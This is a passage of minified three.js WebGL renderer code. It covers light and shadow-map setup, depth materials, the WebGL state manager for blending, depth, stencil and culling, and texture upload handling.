                            if (e.position.setFromMatrixPosition(t.matrixWorld), e.color.copy(v).multiplyScalar(y), e.distance = x, e.coneCos = Math.cos(t.angle), e.penumbraCos = Math.cos(t.angle * (1 - t.penumbra)), e.decay = t.decay, t.castShadow) {
                                const e = t.shadow,
                                    n = i.get(t);
                                n.shadowBias = e.bias, n.shadowNormalBias = e.normalBias, n.shadowRadius = e.radius, n.shadowMapSize = e.mapSize, r.spotShadow[h] = n, r.spotShadowMap[h] = _, r.spotShadowMatrix[h] = t.shadow.matrix, g++
                            }
                            r.spot[h] = e, h++
                        } else if (t.isRectAreaLight) {
                            const e = n.get(t);
                            e.color.copy(v).multiplyScalar(y), e.halfWidth.set(.5 * t.width, 0, 0), e.halfHeight.set(0, .5 * t.height, 0), r.rectArea[d] = e, d++
                        } else if (t.isPointLight) {
                            const e = n.get(t);
                            if (e.color.copy(t.color).multiplyScalar(t.intensity), e.distance = t.distance, e.decay = t.decay, t.castShadow) {
                                const e = t.shadow,
                                    n = i.get(t);
                                n.shadowBias = e.bias, n.shadowNormalBias = e.normalBias, n.shadowRadius = e.radius, n.shadowMapSize = e.mapSize, n.shadowCameraNear = e.camera.near, n.shadowCameraFar = e.camera.far, r.pointShadow[u] = n, r.pointShadowMap[u] = _, r.pointShadowMatrix[u] = t.shadow.matrix, m++
                            }
                            r.point[u] = e, u++
                        } else if (t.isHemisphereLight) {
                            const e = n.get(t);
                            e.skyColor.copy(t.color).multiplyScalar(y), e.groundColor.copy(t.groundColor).multiplyScalar(y), r.hemi[p] = e, p++
                        }
                    }
                    d > 0 && (t.isWebGL2 || !0 === e.has("OES_texture_float_linear") ? (r.rectAreaLTC1 = Qn.LTC_FLOAT_1, r.rectAreaLTC2 = Qn.LTC_FLOAT_2) : !0 === e.has("OES_texture_half_float_linear") ? (r.rectAreaLTC1 = Qn.LTC_HALF_1, r.rectAreaLTC2 = Qn.LTC_HALF_2) : console.error("THREE.WebGLRenderer: Unable to use RectAreaLight. Missing WebGL extensions.")), r.ambient[0] = o, r.ambient[1] = s, r.ambient[2] = l;
                    const v = r.hash;
                    v.directionalLength === c && v.pointLength === u && v.spotLength === h && v.rectAreaLength === d && v.hemiLength === p && v.numDirectionalShadows === f && v.numPointShadows === m && v.numSpotShadows === g || (r.directional.length = c, r.spot.length = h, r.rectArea.length = d, r.point.length = u, r.hemi.length = p, r.directionalShadow.length = f, r.directionalShadowMap.length = f, r.pointShadow.length = m, r.pointShadowMap.length = m, r.spotShadow.length = g, r.spotShadowMap.length = g, r.directionalShadowMatrix.length = f, r.pointShadowMatrix.length = m, r.spotShadowMatrix.length = g, v.directionalLength = c, v.pointLength = u, v.spotLength = h, v.rectAreaLength = d, v.hemiLength = p, v.numDirectionalShadows = f, v.numPointShadows = m, v.numSpotShadows = g, r.version = zr++)
                },
                setupView: function(e, t) {
                    let n = 0,
                        i = 0,
                        l = 0,
                        c = 0,
                        u = 0;
                    const h = t.matrixWorldInverse;
                    for (let t = 0, d = e.length; t < d; t++) {
                        const d = e[t];
                        if (d.isDirectionalLight) {
                            const e = r.directional[n];
                            e.direction.setFromMatrixPosition(d.matrixWorld), a.setFromMatrixPosition(d.target.matrixWorld), e.direction.sub(a), e.direction.transformDirection(h), n++
                        } else if (d.isSpotLight) {
                            const e = r.spot[l];
                            e.position.setFromMatrixPosition(d.matrixWorld), e.position.applyMatrix4(h), e.direction.setFromMatrixPosition(d.matrixWorld), a.setFromMatrixPosition(d.target.matrixWorld), e.direction.sub(a), e.direction.transformDirection(h), l++
                        } else if (d.isRectAreaLight) {
                            const e = r.rectArea[c];
                            e.position.setFromMatrixPosition(d.matrixWorld), e.position.applyMatrix4(h), s.identity(), o.copy(d.matrixWorld), o.premultiply(h), s.extractRotation(o), e.halfWidth.set(.5 * d.width, 0, 0), e.halfHeight.set(0, .5 * d.height, 0), e.halfWidth.applyMatrix4(s), e.halfHeight.applyMatrix4(s), c++
                        } else if (d.isPointLight) {
                            const e = r.point[i];
                            e.position.setFromMatrixPosition(d.matrixWorld), e.position.applyMatrix4(h), i++
                        } else if (d.isHemisphereLight) {
                            const e = r.hemi[u];
                            e.direction.setFromMatrixPosition(d.matrixWorld), e.direction.transformDirection(h), e.direction.normalize(), u++
                        }
                    }
                },
                state: r
            }
        }

        function kr(e, t) {
            const n = new Gr(e, t),
                i = [],
                r = [];
            return { init: function() { i.length = 0, r.length = 0 }, state: { lightsArray: i, shadowsArray: r, lights: n }, setupLights: function() { n.setup(i) }, setupLightsView: function(e) { n.setupView(i, e) }, pushLight: function(e) { i.push(e) }, pushShadow: function(e) { r.push(e) } }
        }

        function Vr(e, t) { let n = new WeakMap; return { get: function(i, r = 0) { let a; return !1 === n.has(i) ? (a = new kr(e, t), n.set(i, [a])) : r >= n.get(i).length ? (a = new kr(e, t), n.get(i).push(a)) : a = n.get(i)[r], a }, dispose: function() { n = new WeakMap } } }
        class Wr extends Ut {
            constructor(e) { super(), this.type = "MeshDepthMaterial", this.depthPacking = 3200, this.skinning = !1, this.morphTargets = !1, this.map = null, this.alphaMap = null, this.displacementMap = null, this.displacementScale = 1, this.displacementBias = 0, this.wireframe = !1, this.wireframeLinewidth = 1, this.fog = !1, this.setValues(e) }
            copy(e) { return super.copy(e), this.depthPacking = e.depthPacking, this.skinning = e.skinning, this.morphTargets = e.morphTargets, this.map = e.map, this.alphaMap = e.alphaMap, this.displacementMap = e.displacementMap, this.displacementScale = e.displacementScale, this.displacementBias = e.displacementBias, this.wireframe = e.wireframe, this.wireframeLinewidth = e.wireframeLinewidth, this }
        }
        Wr.prototype.isMeshDepthMaterial = !0;
        class jr extends Ut {
            constructor(e) { super(), this.type = "MeshDistanceMaterial", this.referencePosition = new be, this.nearDistance = 1, this.farDistance = 1e3, this.skinning = !1, this.morphTargets = !1, this.map = null, this.alphaMap = null, this.displacementMap = null, this.displacementScale = 1, this.displacementBias = 0, this.fog = !1, this.setValues(e) }
            copy(e) { return super.copy(e), this.referencePosition.copy(e.referencePosition), this.nearDistance = e.nearDistance, this.farDistance = e.farDistance, this.skinning = e.skinning, this.morphTargets = e.morphTargets, this.map = e.map, this.alphaMap = e.alphaMap, this.displacementMap = e.displacementMap, this.displacementScale = e.displacementScale, this.displacementBias = e.displacementBias, this }
        }

        function qr(e, t, n) {
            let i = new Yn;
            const r = new he,
                a = new he,
                o = new ye,
                s = [],
                l = [],
                c = {},
                u = { 0: 1, 1: 0, 2: 2 },
                h = new Fn({ defines: { SAMPLE_RATE: 2 / 8, HALF_SAMPLE_RATE: 1 / 8 }, uniforms: { shadow_pass: { value: null }, resolution: { value: new he }, radius: { value: 4 } }, vertexShader: "void main() {\n\tgl_Position = vec4( position, 1.0 );\n}", fragmentShader: "uniform sampler2D shadow_pass;\nuniform vec2 resolution;\nuniform float radius;\n#include <packing>\nvoid main() {\n\tfloat mean = 0.0;\n\tfloat squared_mean = 0.0;\n\tfloat depth = unpackRGBAToDepth( texture2D( shadow_pass, ( gl_FragCoord.xy ) / resolution ) );\n\tfor ( float i = -1.0; i < 1.0 ; i += SAMPLE_RATE) {\n\t\t#ifdef HORIZONTAL_PASS\n\t\t\tvec2 distribution = unpackRGBATo2Half( texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( i, 0.0 ) * radius ) / resolution ) );\n\t\t\tmean += distribution.x;\n\t\t\tsquared_mean += distribution.y * distribution.y + distribution.x * distribution.x;\n\t\t#else\n\t\t\tfloat depth = unpackRGBAToDepth( texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( 0.0, i ) * radius ) / resolution ) );\n\t\t\tmean += depth;\n\t\t\tsquared_mean += depth * depth;\n\t\t#endif\n\t}\n\tmean = mean * HALF_SAMPLE_RATE;\n\tsquared_mean = squared_mean * HALF_SAMPLE_RATE;\n\tfloat std_dev = sqrt( squared_mean - mean * mean );\n\tgl_FragColor = pack2HalfToRGBA( vec2( mean, std_dev ) );\n}" }),
                d = h.clone();
            d.defines.HORIZONTAL_PASS = 1;
            const p = new fn;
            p.setAttribute("position", new Yt(new Float32Array([-1, -1, .5, 3, -1, .5, -1, 3, .5]), 3));
            const f = new Dn(p, h),
                m = this;

            function g(n, i) {
                const r = t.update(f);
                h.uniforms.shadow_pass.value = n.map.texture, h.uniforms.resolution.value = n.mapSize, h.uniforms.radius.value = n.radius, e.setRenderTarget(n.mapPass), e.clear(), e.renderBufferDirect(i, null, r, h, f, null), d.uniforms.shadow_pass.value = n.mapPass.texture, d.uniforms.resolution.value = n.mapSize, d.uniforms.radius.value = n.radius, e.setRenderTarget(n.map), e.clear(), e.renderBufferDirect(i, null, r, d, f, null)
            }

            function v(e, t, n) { const i = e | t << 1 | n << 2; let r = s[i]; return void 0 === r && (r = new Wr({ depthPacking: 3201, morphTargets: e, skinning: t }), s[i] = r), r }

            function y(e, t, n) { const i = e | t << 1 | n << 2; let r = l[i]; return void 0 === r && (r = new jr({ morphTargets: e, skinning: t }), l[i] = r), r }

            function x(t, n, i, r, a, o, s) {
                let l = null,
                    h = v,
                    d = t.customDepthMaterial;
                if (!0 === r.isPointLight && (h = y, d = t.customDistanceMaterial), void 0 === d) { let e = !1;!0 === i.morphTargets && (e = n.morphAttributes && n.morphAttributes.position && n.morphAttributes.position.length > 0); let r = !1;!0 === t.isSkinnedMesh && (!0 === i.skinning ? r = !0 : console.warn("THREE.WebGLShadowMap: THREE.SkinnedMesh with material.skinning set to false:", t)), l = h(e, r, !0 === t.isInstancedMesh) } else l = d;
                if (e.localClippingEnabled && !0 === i.clipShadows && 0 !== i.clippingPlanes.length) {
                    const e = l.uuid,
                        t = i.uuid;
                    let n = c[e];
                    void 0 === n && (n = {}, c[e] = n);
                    let r = n[t];
                    void 0 === r && (r = l.clone(), n[t] = r), l = r
                }
                return l.visible = i.visible, l.wireframe = i.wireframe, l.side = 3 === s ? null !== i.shadowSide ? i.shadowSide : i.side : null !== i.shadowSide ? i.shadowSide : u[i.side], l.clipShadows = i.clipShadows, l.clippingPlanes = i.clippingPlanes, l.clipIntersection = i.clipIntersection, l.wireframeLinewidth = i.wireframeLinewidth, l.linewidth = i.linewidth, !0 === r.isPointLight && !0 === l.isMeshDistanceMaterial && (l.referencePosition.setFromMatrixPosition(r.matrixWorld), l.nearDistance = a, l.farDistance = o), l
            }

            function _(n, r, a, o, s) {
                if (!1 === n.visible) return;
                if (n.layers.test(r.layers) && (n.isMesh || n.isLine || n.isPoints) && (n.castShadow || n.receiveShadow && 3 === s) && (!n.frustumCulled || i.intersectsObject(n))) {
                    n.modelViewMatrix.multiplyMatrices(a.matrixWorldInverse, n.matrixWorld);
                    const i = t.update(n),
                        r = n.material;
                    if (Array.isArray(r)) {
                        const t = i.groups;
                        for (let l = 0, c = t.length; l < c; l++) {
                            const c = t[l],
                                u = r[c.materialIndex];
                            if (u && u.visible) {
                                const t = x(n, i, u, o, a.near, a.far, s);
                                e.renderBufferDirect(a, null, i, t, n, c)
                            }
                        }
                    } else if (r.visible) {
                        const t = x(n, i, r, o, a.near, a.far, s);
                        e.renderBufferDirect(a, null, i, t, n, null)
                    }
                }
                const l = n.children;
                for (let e = 0, t = l.length; e < t; e++) _(l[e], r, a, o, s)
            }
            this.enabled = !1, this.autoUpdate = !0, this.needsUpdate = !1, this.type = 1, this.render = function(t, s, l) {
                if (!1 === m.enabled) return;
                if (!1 === m.autoUpdate && !1 === m.needsUpdate) return;
                if (0 === t.length) return;
                const c = e.getRenderTarget(),
                    u = e.getActiveCubeFace(),
                    h = e.getActiveMipmapLevel(),
                    d = e.state;
                d.setBlending(0), d.buffers.color.setClear(1, 1, 1, 1), d.buffers.depth.setTest(!0), d.setScissorTest(!1);
                for (let c = 0, u = t.length; c < u; c++) {
                    const u = t[c],
                        h = u.shadow;
                    if (void 0 === h) { console.warn("THREE.WebGLShadowMap:", u, "has no shadow."); continue }
                    if (!1 === h.autoUpdate && !1 === h.needsUpdate) continue;
                    r.copy(h.mapSize);
                    const p = h.getFrameExtents();
                    if (r.multiply(p), a.copy(h.mapSize), (r.x > n || r.y > n) && (r.x > n && (a.x = Math.floor(n / p.x), r.x = a.x * p.x, h.mapSize.x = a.x), r.y > n && (a.y = Math.floor(n / p.y), r.y = a.y * p.y, h.mapSize.y = a.y)), null === h.map && !h.isPointLightShadow && 3 === this.type) {
                        const e = { minFilter: B, magFilter: B, format: Z };
                        h.map = new xe(r.x, r.y, e), h.map.texture.name = u.name + ".shadowMap", h.mapPass = new xe(r.x, r.y, e), h.camera.updateProjectionMatrix()
                    }
                    if (null === h.map) {
                        const e = { minFilter: U, magFilter: U, format: Z };
                        h.map = new xe(r.x, r.y, e), h.map.texture.name = u.name + ".shadowMap", h.camera.updateProjectionMatrix()
                    }
                    e.setRenderTarget(h.map), e.clear();
                    const f = h.getViewportCount();
                    for (let e = 0; e < f; e++) {
                        const t = h.getViewport(e);
                        o.set(a.x * t.x, a.y * t.y, a.x * t.z, a.y * t.w), d.viewport(o), h.updateMatrices(u, e), i = h.getFrustum(), _(s, l, h.camera, u, this.type)
                    }
                    h.isPointLightShadow || 3 !== this.type || g(h, l), h.needsUpdate = !1
                }
                m.needsUpdate = !1, e.setRenderTarget(c, u, h)
            }
        }

        function Xr(e, t, n) {
            const i = n.isWebGL2,
                r = new function() { let t = !1; const n = new ye; let i = null; const r = new ye(0, 0, 0, 0); return { setMask: function(n) { i === n || t || (e.colorMask(n, n, n, n), i = n) }, setLocked: function(e) { t = e }, setClear: function(t, i, a, o, s) {!0 === s && (t *= o, i *= o, a *= o), n.set(t, i, a, o), !1 === r.equals(n) && (e.clearColor(t, i, a, o), r.copy(n)) }, reset: function() { t = !1, i = null, r.set(-1, 0, 0, 0) } } },
                a = new function() {
                    let t = !1,
                        n = null,
                        i = null,
                        r = null;
                    return {
                        setTest: function(e) { e ? I(2929) : O(2929) },
                        setMask: function(i) { n === i || t || (e.depthMask(i), n = i) },
                        setFunc: function(t) {
                            if (i !== t) {
                                if (t) switch (t) {
                                    case 0:
                                        e.depthFunc(512);
                                        break;
                                    case 1:
                                        e.depthFunc(519);
                                        break;
                                    case 2:
                                        e.depthFunc(513);
                                        break;
                                    case 3:
                                    default:
                                        e.depthFunc(515);
                                        break;
                                    case 4:
                                        e.depthFunc(514);
                                        break;
                                    case 5:
                                        e.depthFunc(518);
                                        break;
                                    case 6:
                                        e.depthFunc(516);
                                        break;
                                    case 7:
                                        e.depthFunc(517)
                                } else e.depthFunc(515);
                                i = t
                            }
                        },
                        setLocked: function(e) { t = e },
                        setClear: function(t) { r !== t && (e.clearDepth(t), r = t) },
                        reset: function() { t = !1, n = null, i = null, r = null }
                    }
                },
                o = new function() {
                    let t = !1,
                        n = null,
                        i = null,
                        r = null,
                        a = null,
                        o = null,
                        s = null,
                        l = null,
                        c = null;
                    return { setTest: function(e) { t || (e ? I(2960) : O(2960)) }, setMask: function(i) { n === i || t || (e.stencilMask(i), n = i) }, setFunc: function(t, n, o) { i === t && r === n && a === o || (e.stencilFunc(t, n, o), i = t, r = n, a = o) }, setOp: function(t, n, i) { o === t && s === n && l === i || (e.stencilOp(t, n, i), o = t, s = n, l = i) }, setLocked: function(e) { t = e }, setClear: function(t) { c !== t && (e.clearStencil(t), c = t) }, reset: function() { t = !1, n = null, i = null, r = null, a = null, o = null, s = null, l = null, c = null } }
                };
            let s = {},
                l = null,
                c = !1,
                u = null,
                h = null,
                d = null,
                p = null,
                f = null,
                m = null,
                g = null,
                v = !1,
                y = null,
                x = null,
                _ = null,
                b = null,
                w = null;
            const M = e.getParameter(35661);
            let T = !1,
                E = 0;
            const S = e.getParameter(7938); - 1 !== S.indexOf("WebGL") ? (E = parseFloat(/^WebGL (\d)/.exec(S)[1]), T = E >= 1) : -1 !== S.indexOf("OpenGL ES") && (E = parseFloat(/^OpenGL ES (\d)/.exec(S)[1]), T = E >= 2);
            let L = null,
                A = {};
            const R = new ye,
                P = new ye;

            function C(t, n, i) {
                const r = new Uint8Array(4),
                    a = e.createTexture();
                e.bindTexture(t, a), e.texParameteri(t, 10241, 9728), e.texParameteri(t, 10240, 9728);
                for (let t = 0; t < i; t++) e.texImage2D(n + t, 0, 6408, 1, 1, 0, 6408, 5121, r);
                return a
            }
            const D = {};

            function I(t) {!0 !== s[t] && (e.enable(t), s[t] = !0) }

            function O(t) {!1 !== s[t] && (e.disable(t), s[t] = !1) }
            D[3553] = C(3553, 3553, 1), D[34067] = C(34067, 34069, 6), r.setClear(0, 0, 0, 1), a.setClear(1), o.setClear(0), I(2929), a.setFunc(3), z(!1), B(1), I(2884), F(0);
            const H = {
                [N]: 32774,
                101: 32778,
                102: 32779
            };
            if (i) H[103] = 32775, H[104] = 32776;
            else {
                const e = t.get("EXT_blend_minmax");
                null !== e && (H[103] = e.MIN_EXT, H[104] = e.MAX_EXT)
            }
            const U = { 200: 0, 201: 1, 202: 768, 204: 770, 210: 776, 208: 774, 206: 772, 203: 769, 205: 771, 209: 775, 207: 773 };

            function F(t, n, i, r, a, o, s, l) {
                if (0 !== t) {
                    if (!1 === c && (I(3042), c = !0), 5 === t) a = a || n, o = o || i, s = s || r, n === h && a === f || (e.blendEquationSeparate(H[n], H[a]), h = n, f = a), i === d && r === p && o === m && s === g || (e.blendFuncSeparate(U[i], U[r], U[o], U[s]), d = i, p = r, m = o, g = s), u = t, v = null;
                    else if (t !== u || l !== v) {
                        if (h === N && f === N || (e.blendEquation(32774), h = N, f = N), l) switch (t) {
                            case 1:
                                e.blendFuncSeparate(1, 771, 1, 771);
                                break;
                            case 2:
                                e.blendFunc(1, 1);
                                break;
                            case 3:
                                e.blendFuncSeparate(0, 0, 769, 771);
                                break;
                            case 4:
                                e.blendFuncSeparate(0, 768, 0, 770);
                                break;
                            default:
                                console.error("THREE.WebGLState: Invalid blending: ", t)
                        } else switch (t) {
                            case 1:
                                e.blendFuncSeparate(770, 771, 1, 771);
                                break;
                            case 2:
                                e.blendFunc(770, 1);
                                break;
                            case 3:
                                e.blendFunc(0, 769);
                                break;
                            case 4:
                                e.blendFunc(0, 768);
                                break;
                            default:
                                console.error("THREE.WebGLState: Invalid blending: ", t)
                        }
                        d = null, p = null, m = null, g = null, u = t, v = l
                    }
                } else !0 === c && (O(3042), c = !1)
            }

            function z(t) { y !== t && (t ? e.frontFace(2304) : e.frontFace(2305), y = t) }

            function B(t) { 0 !== t ? (I(2884), t !== x && (1 === t ? e.cullFace(1029) : 2 === t ? e.cullFace(1028) : e.cullFace(1032))) : O(2884), x = t }

            function G(t, n, i) { t ? (I(32823), b === n && w === i || (e.polygonOffset(n, i), b = n, w = i)) : O(32823) }

            function k(t) { void 0 === t && (t = 33984 + M - 1), L !== t && (e.activeTexture(t), L = t) }
            return {
                buffers: { color: r, depth: a, stencil: o },
                enable: I,
                disable: O,
                useProgram: function(t) { return l !== t && (e.useProgram(t), l = t, !0) },
                setBlending: F,
                setMaterial: function(e, t) {
                    2 === e.side ? O(2884) : I(2884);
                    let n = 1 === e.side;
                    t && (n = !n), z(n), 1 === e.blending && !1 === e.transparent ? F(0) : F(e.blending, e.blendEquation, e.blendSrc, e.blendDst, e.blendEquationAlpha, e.blendSrcAlpha, e.blendDstAlpha, e.premultipliedAlpha), a.setFunc(e.depthFunc), a.setTest(e.depthTest), a.setMask(e.depthWrite), r.setMask(e.colorWrite);
                    const i = e.stencilWrite;
                    o.setTest(i), i && (o.setMask(e.stencilWriteMask), o.setFunc(e.stencilFunc, e.stencilRef, e.stencilFuncMask), o.setOp(e.stencilFail, e.stencilZFail, e.stencilZPass)), G(e.polygonOffset, e.polygonOffsetFactor, e.polygonOffsetUnits)
                },
                setFlipSided: z,
                setCullFace: B,
                setLineWidth: function(t) { t !== _ && (T && e.lineWidth(t), _ = t) },
                setPolygonOffset: G,
                setScissorTest: function(e) { e ? I(3089) : O(3089) },
                activeTexture: k,
                bindTexture: function(t, n) {
                    null === L && k();
                    let i = A[L];
                    void 0 === i && (i = { type: void 0, texture: void 0 }, A[L] = i), i.type === t && i.texture === n || (e.bindTexture(t, n || D[t]), i.type = t, i.texture = n)
                },
                unbindTexture: function() {
                    const t = A[L];
                    void 0 !== t && void 0 !== t.type && (e.bindTexture(t.type, null), t.type = void 0, t.texture = void 0)
                },
                compressedTexImage2D: function() { try { e.compressedTexImage2D.apply(e, arguments) } catch (e) { console.error("THREE.WebGLState:", e) } },
                texImage2D: function() { try { e.texImage2D.apply(e, arguments) } catch (e) { console.error("THREE.WebGLState:", e) } },
                texImage3D: function() { try { e.texImage3D.apply(e, arguments) } catch (e) { console.error("THREE.WebGLState:", e) } },
                scissor: function(t) {!1 === R.equals(t) && (e.scissor(t.x, t.y, t.z, t.w), R.copy(t)) },
                viewport: function(t) {!1 === P.equals(t) && (e.viewport(t.x, t.y, t.z, t.w), P.copy(t)) },
                reset: function() { e.disable(3042), e.disable(2884), e.disable(2929), e.disable(32823), e.disable(3089), e.disable(2960), e.blendEquation(32774), e.blendFunc(1, 0), e.blendFuncSeparate(1, 0, 1, 0), e.colorMask(!0, !0, !0, !0), e.clearColor(0, 0, 0, 0), e.depthMask(!0), e.depthFunc(513), e.clearDepth(1), e.stencilMask(4294967295), e.stencilFunc(519, 0, 4294967295), e.stencilOp(7680, 7680, 7680), e.clearStencil(0), e.cullFace(1029), e.frontFace(2305), e.polygonOffset(0, 0), e.activeTexture(33984), e.useProgram(null), e.lineWidth(1), e.scissor(0, 0, e.canvas.width, e.canvas.height), e.viewport(0, 0, e.canvas.width, e.canvas.height), s = {}, L = null, A = {}, l = null, c = !1, u = null, h = null, d = null, p = null, f = null, m = null, g = null, v = !1, y = null, x = null, _ = null, b = null, w = null, r.reset(), a.reset(), o.reset() }
            }
        }

        function Yr(e, t, n, i, r, a, o) {
            const s = r.isWebGL2,
                l = r.maxTextures,
                c = r.maxCubemapSize,
                u = r.maxTextureSize,
                h = r.maxSamples,
                d = new WeakMap;
            let p, f = !1;
            try { f = "undefined" != typeof OffscreenCanvas && null !== new OffscreenCanvas(1, 1).getContext("2d") } catch (e) {}

            function m(e, t) { return f ? new OffscreenCanvas(e, t) : document.createElementNS("http://www.w3.org/1999/xhtml", "canvas") }

            function g(e, t, n, i) {
                let r = 1;
                if ((e.width > i || e.height > i) && (r = i / Math.max(e.width, e.height)), r < 1 || !0 === t) {
                    if ("undefined" != typeof HTMLImageElement && e instanceof HTMLImageElement || "undefined" != typeof HTMLCanvasElement && e instanceof HTMLCanvasElement || "undefined" != typeof ImageBitmap && e instanceof ImageBitmap) {
                        const i = t ? ue.floorPowerOfTwo : Math.floor,
                            a = i(r * e.width),
                            o = i(r * e.height);
                        void 0 === p && (p = m(a, o));
                        const s = n ? m(a, o) : p;
                        return s.width = a, s.height = o, s.getContext("2d").drawImage(e, 0, 0, a, o), console.warn("THREE.WebGLRenderer: Texture has been resized from (" + e.width + "x" + e.height + ") to (" + a + "x" + o + ")."), s
                    }
                    return "data" in e && console.warn("THREE.WebGLRenderer: Image in DataTexture is too big (" + e.width + "x" + e.height + ")."), e
                }
                return e
            }

            function v(e) { return ue.isPowerOfTwo(e.width) && ue.isPowerOfTwo(e.height) }

            function y(e, t) { return e.generateMipmaps && t && e.minFilter !== U && e.minFilter !== B }

            function x(t, n, r, a) { e.generateMipmap(t), i.get(n).__maxMipLevel = Math.log2(Math.max(r, a)) }

            function _(n, i, r) {
                if (!1 === s) return i;
                if (null !== n) {
                    if (void 0 !== e[n]) return e[n];
                    console.warn("THREE.WebGLRenderer: Attempt to use non-existing WebGL internal format '" + n + "'")
                }
                let a = i;
                return 6403 === i && (5126 === r && (a = 33326), 5131 === r && (a = 33325), 5121 === r && (a = 33321)), 6407 === i && (5126 === r && (a = 34837), 5131 === r && (a = 34843), 5121 === r && (a = 32849)), 6408 === i && (5126 === r && (a = 34836), 5131 === r && (a = 34842), 5121 === r && (a = 32856)), 33325 !== a && 33326 !== a && 34842 !== a && 34836 !== a || t.get("EXT_color_buffer_float"), a
            }

            function b(e) { return e === U || e === F || e === z ? 9728 : 9729 }

            function w(t) {
                const n = t.target;
                n.removeEventListener("dispose", w),
                    function(t) {
                        const n = i.get(t);
                        void 0 !== n.__webglInit && (e.deleteTexture(n.__webglTexture), i.remove(t))
                    }(n), n.isVideoTexture && d.delete(n), o.memory.textures--
            }

            function M(t) {
                const n = t.target;
                n.removeEventListener("dispose", M),
                    function(t) {
                        const n = t.texture,
                            r = i.get(t),
                            a = i.get(n);
                        if (t) {
                            if (void 0 !== a.__webglTexture && e.deleteTexture(a.__webglTexture), t.depthTexture && t.depthTexture.dispose(), t.isWebGLCubeRenderTarget)
                                for (let t = 0; t < 6; t++) e.deleteFramebuffer(r.__webglFramebuffer[t]), r.__webglDepthbuffer && e.deleteRenderbuffer(r.__webglDepthbuffer[t]);
                            else e.deleteFramebuffer(r.__webglFramebuffer), r.__webglDepthbuffer && e.deleteRenderbuffer(r.__webglDepthbuffer), r.__webglMultisampledFramebuffer && e.deleteFramebuffer(r.__webglMultisampledFramebuffer), r.__webglColorRenderbuffer && e.deleteRenderbuffer(r.__webglColorRenderbuffer), r.__webglDepthRenderbuffer && e.deleteRenderbuffer(r.__webglDepthRenderbuffer);
                            i.remove(n), i.remove(t)
                        }
                    }(n), o.memory.textures--
            }
            let T = 0;

            function E(e, t) {
                const r = i.get(e);
                if (e.isVideoTexture && function(e) {
                        const t = o.render.frame;
                        d.get(e) !== t && (d.set(e, t), e.update())
                    }(e), e.version > 0 && r.__version !== e.version) {
                    const n = e.image;
                    if (void 0 === n) console.warn("THREE.WebGLRenderer: Texture marked for update but image is undefined");
                    else {
                        if (!1 !== n.complete) return void C(r, e, t);
                        console.warn("THREE.WebGLRenderer: Texture marked for update but image is incomplete")
                    }
                }
                n.activeTexture(33984 + t), n.bindTexture(3553, r.__webglTexture)
            }

            function S(t, r) {
                const o = i.get(t);
                t.version > 0 && o.__version !== t.version ? function(t, i, r) {
                    if (6 !== i.image.length) return;
                    P(t, i), n.activeTexture(33984 + r), n.bindTexture(34067, t.__webglTexture), e.pixelStorei(37440, i.flipY), e.pixelStorei(37441, i.premultiplyAlpha), e.pixelStorei(3317, i.unpackAlignment), e.pixelStorei(37443, 0);
                    const o = i && (i.isCompressedTexture || i.image[0].isCompressedTexture),
                        l = i.image[0] && i.image[0].isDataTexture,
                        u = [];
                    for (let e = 0; e < 6; e++) u[e] = o || l ? l ? i.image[e].image : i.image[e] : g(i.image[e], !1, !0, c);
                    const h = u[0],
                        d = v(h) || s,
                        p = a.convert(i.format),
                        f = a.convert(i.type),
                        m = _(i.internalFormat, p, f);
                    let b;
                    if (R(34067, i, d), o) {
                        for (let e = 0; e < 6; e++) {
                            b = u[e].mipmaps;
                            for (let t = 0; t < b.length; t++) {
                                const r = b[t];
                                i.format !== Z && i.format !== Y ? null !== p ? n.compressedTexImage2D(34069 + e, t, m, r.width, r.height, 0, r.data) : console.warn("THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .setTextureCube()") : n.texImage2D(34069 + e, t, m, r.width, r.height, 0, p, f, r.data)
                            }
                        }
                        t.__maxMipLevel = b.length - 1
                    } else {
                        b = i.mipmaps;
                        for (let e = 0; e < 6; e++)
                            if (l) {
                                n.texImage2D(34069 + e, 0, m, u[e].width, u[e].height, 0, p, f, u[e].data);
                                for (let t = 0; t < b.length; t++) {
                                    const i = b[t].image[e].image;
                                    n.texImage2D(34069 + e, t + 1, m, i.width, i.height, 0, p, f, i.data)
                                }
                            } else {
                                n.texImage2D(34069 + e, 0, m, p, f, u[e]);
                                for (let t = 0; t < b.length; t++) {
                                    const i = b[t];
                                    n.texImage2D(34069 + e, t + 1, m, p, f, i.image[e])
                                }
                            }
                        t.__maxMipLevel = b.length
                    }
                    y(i, d) && x(34067, i, h.width, h.height), t.__version = i.version, i.onUpdate && i.onUpdate(i)
                }(o, t, r) : (n.activeTexture(33984 + r), n.bindTexture(34067, o.__webglTexture))
            }
            const L = {
                    [I]: 10497,
                    [O]: 33071,
                    [H]: 33648
                },
                A = {
                    [U]: 9728,
                    [F]: 9984,
                    [z]: 9986,
                    [B]: 9729,
                    1007: 9985,
                    [G]: 9987
                };

            function R(n, a, o) {
                if (o ? (e.texParameteri(n, 10242, L[a.wrapS]), e.texParameteri(n, 10243, L[a.wrapT]), 32879 !== n && 35866 !== n || e.texParameteri(n, 32882, L[a.wrapR]), e.texParameteri(n, 10240, A[a.magFilter]), e.texParameteri(n, 10241, A[a.minFilter])) : (e.texParameteri(n, 10242, 33071), e.texParameteri(n, 10243, 33071), 32879 !== n && 35866 !== n || e.texParameteri(n, 32882, 33071), a.wrapS === O && a.wrapT === O || console.warn("THREE.WebGLRenderer: Texture is not power of two. Texture.wrapS and Texture.wrapT should be set to THREE.ClampToEdgeWrapping."), e.texParameteri(n, 10240, b(a.magFilter)), e.texParameteri(n, 10241, b(a.minFilter)), a.minFilter !== U && a.minFilter !== B && console.warn("THREE.WebGLRenderer: Texture is not power of two. Texture.minFilter should be set to THREE.NearestFilter or THREE.LinearFilter.")), !0 === t.has("EXT_texture_filter_anisotropic")) {
                    const o = t.get("EXT_texture_filter_anisotropic");
                    if (a.type === j && !1 === t.has("OES_texture_float_linear")) return;
                    if (!1 === s && a.type === q && !1 === t.has("OES_texture_half_float_linear")) return;
                    (a.anisotropy > 1 || i.get(a).__currentAnisotropy) && (e.texParameterf(n, o.TEXTURE_MAX_ANISOTROPY_EXT, Math.min(a.anisotropy, r.getMaxAnisotropy())), i.get(a).__currentAnisotropy = a.anisotropy)
                }
            }

            function P(t, n) { void 0 === t.__webglInit && (t.__webglInit = !0, n.addEventListener("dispose", w), t.__webglTexture = e.createTexture(), o.memory.textures++) }

            function C(t, i, r) {
                let o = 3553;
